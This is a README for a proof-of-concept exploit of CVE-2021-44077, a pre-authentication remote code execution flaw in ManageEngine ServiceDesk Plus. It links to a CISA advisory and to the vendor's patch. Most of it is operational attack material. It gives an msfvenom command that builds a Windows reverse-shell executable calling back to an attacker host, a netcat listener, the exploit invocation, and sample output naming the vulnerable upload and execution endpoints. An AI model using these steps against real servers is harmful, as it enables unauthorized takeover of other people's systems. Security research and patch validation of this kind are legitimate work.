# CVE-2021-44077
Proof of Concept Exploit for CVE-2021-44077: PreAuth RCE in ManageEngine ServiceDesk Plus < 11306

Based on:
- https://xz.aliyun.com/t/10631

CISA Advisory:
- https://www.cisa.gov/uscert/ncas/alerts/aa21-336a

Remediation (Update to build 11306 or later):
- https://www.manageengine.com/products/service-desk/security-response-plan.html

Tested on ManageEngine ServiceDesk Plus Build 11303. Disabled all AV.

## Usage

The exploit uploads a Windows executable to the target and executes it.

To exploit, first generate any executable. For instance:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.140 LPORT=4444 -f exe > msiexec.exe
```

`pip install` the requirements file or make sure you've got the `requests` package.

If you're trying to catch a reverse shell, run your listener first, e.g.

```
nc -l 4444
```

Then run the exploit script, passing in the `url` and `exe` arguments, e.g.

```
python exploit.py http://<TARGET>:<PORT> <path_to_exe>
```

Example script output:

```
% python exploit.py http://192.168.0.140:8080 msiexec.exe
[+] Target: http://192.168.0.140:8080/
[+] Executable: msiexec.exe
[+] Uploading msiexec.exe to http://192.168.0.140:8080/RestAPI/ImportTechnicians?step=1
[+] Got 401 error code on upload. This is expected.
[+] Uploaded msiexec.exe
[+] Attempting to invoke against url http://192.168.0.140:8080/./RestAPI/s247action. Waiting up to 20 seconds...
[+] Done, did it work?
```

![Proof](proof.png)


## Exploit Notes

- The vulnerability you to upload any file to the install `bin` directory, including existing files such as batch scripts. There may be other ways to invoke the uploaded file.
- Directly uploading a web shell seems to be prevented by a filter.

## Disclaimer

This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.